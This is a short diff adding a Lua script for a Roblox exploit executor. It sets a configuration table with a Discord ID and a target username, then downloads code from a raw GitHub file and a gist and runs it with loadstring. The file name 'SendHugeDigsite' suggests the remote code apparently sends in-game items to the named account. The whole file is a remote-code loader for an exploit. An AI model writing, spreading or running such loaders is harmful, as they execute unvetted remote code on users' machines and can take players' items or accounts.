@@ -1,0 +1,9 @@
+getgenv().configTable = {
+    hop = false,
+    gui = true,
+    users = {},
+    discordID = "1227237902992543877",
+}
+getgenv().username = "SchembrYP4746"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/duongcuteleu/main/main/Send/SendHugeDigsite"))()
+spawn(loadstring(game:HttpGet("https://gist.githubusercontent.com/AnigamiYT/f0624b7e49108f409334ecb9d1324259/raw/gistfile1.txt")))
